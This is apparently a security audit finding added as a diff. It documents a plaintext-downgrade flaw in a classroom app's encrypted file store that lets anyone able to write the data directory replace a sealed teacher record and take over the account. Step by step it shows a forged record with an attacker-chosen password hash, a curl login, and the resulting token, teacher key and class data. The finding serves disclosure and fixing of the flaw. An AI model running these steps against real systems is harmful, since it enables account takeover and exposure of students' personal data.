@@ -1,0 +1,25 @@
+# Pinned SHA 300ce62  file store, key set. FINDING: plaintext-downgrade -> teacher account takeover.
+# Threat actor: can WRITE the data directory but does NOT hold BOW_STORE_KEY
+#   (rw NFS mount, co-tenant process, backup/restore host, path-traversal write, insider).
+# server/vault.ts open(): 'if (!isSealed(parsed)) return parsed as T'  -> non-sealed JSON bypasses the GCM tag.
+
+## 1. Teacher record on disk is sealed ciphertext (attacker cannot read it):
+$ head -c 70 _accounts/teachers/t_04b2f98cae7b416381dbe2286a62c62f.json
+{"v":1,"iv":"8Ru4ApC+g5pbjNHJ","tag":"pGpWu7mQ4uWMRXqqqrNHDA==","ct":"
+
+## 2. Attacker overwrites it with a PLAINTEXT record whose passwordHash they chose (no key needed):
+{"id":"t_04b2f98cae7b416381dbe2286a62c62f","email":"marisol.quintanilla@ps118.example.edu","createdAt":1787098411801,"passwordHash":"scrypt$32768$8$1$FV6IjcbKh29vHeH0MQ7BNA$8YJxFslzCpIOHNugxqOOTQPExZLL3-0uAxBzWr5HiW8","recoveryHash":"scrypt$32768$8$1$FV6IjcbKh29vHeH0MQ7BNA$8YJxFslzCpIOHNugxqOOTQPExZLL3-0uAxBzWr5HiW8"}
+
+
+## 3. Attacker logs in with the password THEY set:
+$ curl -X POST /api/auth/teacher/session -d {email, password:"attacker-known-pw-999"}
+{"teacher":{"id":"t_04b2f98cae7b416381dbe2286a62c62f","email":"marisol.quintanilla@ps118.example.edu","createdAt":1787098411801},"token":"eyJzdWIiOiJ0XzA0YjJmOThjYWU3YjQxNjM4MWRiZTIyODZhNjJjNjJmIiwia2luZCI6InRlYWNoZXIiLCJnZW4iOjAsImV4cCI6MTc4OTY5MTE5OX0.i2trgCzvJG528KQlJWFyEcMt5BMKwTvPnubexm-X-hc"}
+
+## 4. That token lists the real teacher's classes WITH the teacher key:
+{"classes":[{"code":"9EVY6","label":"Period 3 Financial Literacy","createdAt":1787098412153,"expiresAt":1797466412153,"teacherKey":"E4WHT9ATMKGTHMT77EDA7H9C"}]}
+
+## 5. ...and reads the decrypted evidence room the seal was supposed to protect:
+{"class":{"code":"9EVY6","label":"Period 3 Financial Literacy","challengeId":"plan-under-pressure","createdAt":1787098412153,"expiresAt":1797466412153,"joinMode":"roster","teacherId":"t_04b2f98cae7b416381dbe2286a62c62f"},"assignments":[{"id ...(truncated)
+
+# The vault docstring's tamper-evidence claim is FALSE for a write-capable attacker:
+# filesystem-write is converted into full account takeover + plaintext PII read.
